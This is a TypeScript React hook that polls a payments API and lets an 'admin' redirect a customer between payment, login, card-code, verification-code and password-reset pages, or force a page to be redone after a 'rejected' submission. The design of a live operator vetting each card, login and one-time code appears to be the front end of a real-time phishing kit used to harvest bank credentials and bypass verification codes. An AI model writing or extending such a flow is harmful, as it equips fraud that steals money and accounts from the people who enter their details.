import { useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { paymentsApi } from "../api/payments";

const POLL_INTERVAL_MS = 2000;
const POLL_TIMEOUT_MS = 5 * 60 * 1000;

interface UseFlowPollOptions {
  reference: string;
  currentPage: string;
  enabled?: boolean;
  onReset?: () => void;
}

// Maps the page the customer is currently on → the action name that means
// "admin wants you to redo this same page" (i.e. your submission was rejected).
const PAGE_TO_SELF_ACTION: Record<string, string> = {
  payment: "redirect_payment",
  login: "redirect_login",
  "verify-login": "redirect_verify_login",
  "card-code": "redirect_card_code",
  register: "redirect_create_account",
  "verification-code": "redirect_verification_code",
  "forgot-password": "redirect_reset_password",
};

export function useFlowPoll({
  reference,
  currentPage,
  enabled = true,
  onReset,
}: UseFlowPollOptions) {
  const navigate = useNavigate();

  // Keep a ref with the latest values so the async poll closure never goes stale
  const latestRef = useRef({ reference, currentPage, navigate, onReset });
  latestRef.current = { reference, currentPage, navigate, onReset };

  useEffect(() => {
    if (!enabled || !reference) return;

    const startedAt = Date.now();
    let timerId: ReturnType<typeof setTimeout> | null = null;
    let cancelled = false;

    const run = async () => {
      if (cancelled) return;
      if (Date.now() - startedAt > POLL_TIMEOUT_MS) return;

      const { reference: ref, currentPage: page, navigate: nav, onReset: resetCb } =
        latestRef.current;

      try {
        const result = await paymentsApi.flowCheck(ref, page);

        if (!cancelled) {
          if (result.redirect) {
            // Admin sent customer to a DIFFERENT page — navigate there.
            nav(result.redirect, { state: { reference: ref } });
            return; // stop this poller; the new page will start its own
          }

          if (result.action) {
            const selfAction = PAGE_TO_SELF_ACTION[page];
            if (selfAction && result.action === selfAction) {
              // Admin sent customer back to THIS SAME page (rejection/retry).
              resetCb?.();
              // Keep polling so we can catch the NEXT admin action.
            }
          }
        }
      } catch {
        // network hiccup — keep polling
      }

      if (!cancelled) {
        timerId = setTimeout(run, POLL_INTERVAL_MS);
      }
    };

    timerId = setTimeout(run, POLL_INTERVAL_MS);

    return () => {
      cancelled = true;
      if (timerId) clearTimeout(timerId);
    };
  }, [enabled, reference]); // eslint-disable-line react-hooks/exhaustive-deps
}
